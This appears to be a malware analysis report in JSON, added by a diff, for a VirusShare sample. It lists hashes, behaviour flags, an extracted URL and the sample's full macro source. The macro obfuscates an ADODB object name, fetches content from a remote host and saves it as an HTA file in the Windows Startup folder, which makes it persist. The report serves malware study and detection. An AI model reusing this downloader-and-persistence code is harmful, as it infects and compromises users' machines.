@@ -1,0 +1,56 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Open": "May open a file"
+        },
+        "macro": "Dim ad, rs\nDim b2=\"OD\"\n\nSet ad = CreateObject(\"AD\"+b2+\"B\"+\".C\"+\"onn\"+\"ection\")\nDim sel\nSet sel=\"SE\"+\"LECT * from foobar.txt\"\nConn.Open \"Driver={Microsoft Text Driver (*.txt; *.csv)};\" & \"Dbq=http://www.bienlimh.ch/images;\" & \"Extensions=asc,csv,tab,txt;\" & \"Persist Security Info=False\"\nDim sql\nsql = \"SELECT * from foobar.txt\"\nset rs = conn.execute(sql)\nset rs =CreateObject(\"ADODB.recordset\")\nrs.Open sel, ad\nDim bb4\nrs.Save \"C:\\Docume\"+\"nts and Settings\\All Users\\Start Menu\\Programs\\Startup\\MS Office.hta\", adPersistXML\nDim bb8\nrs.close\nad\t.close\nwindow.close"
+    },
+    "filename": "VirusShare_0b677681abc66d422ce8095bd5acab7c",
+    "filesize": 569,
+    "filetype": "ASCII text",
+    "hashes": {
+        "md5": "0b677681abc66d422ce8095bd5acab7c",
+        "sha1": "5ed13ea53deabec53de553cdfbc319c10ea5df0c",
+        "sha256": "e729df26027113fa39f884cf11f7883ca4b211492ebfe1770c453ee080abbacc"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Dim ad, rs",
+            "Dim b2=\"OD\"",
+            "Set ad = CreateObject(\"AD\"+b2+\"B\"+\".C\"+\"onn\"+\"ection\")",
+            "Dim sel",
+            "Set sel=\"SE\"+\"LECT * from foobar.txt\"",
+            "Conn.Open \"Driver={Microsoft Text Driver (*.txt; *.csv)};\" & _",
+            "\"Dbq=http://www.bienlimh.ch/images;\" & _",
+            "\"Extensions=asc,csv,tab,txt;\" & _",
+            "\"Persist Security Info=False\"",
+            "Dim sql",
+            "sql = \"SELECT * from foobar.txt\"",
+            "set rs = conn.execute(sql)",
+            "set rs =CreateObject(\"ADODB.recordset\")",
+            "rs.Open sel, ad",
+            "Dim bb4",
+            "rs.Save \"C:\\Docume\"+\"nts and Settings\\All Users\\Start Menu\\Programs\\Startup\\MS Office.hta\", adPersistXML",
+            "Dim bb8",
+            "rs.close",
+            "ad\t.close",
+            "window.close"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.bienlimh.ch/images"
+        ]
+    },
+    "time": "0:00:00.308976",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
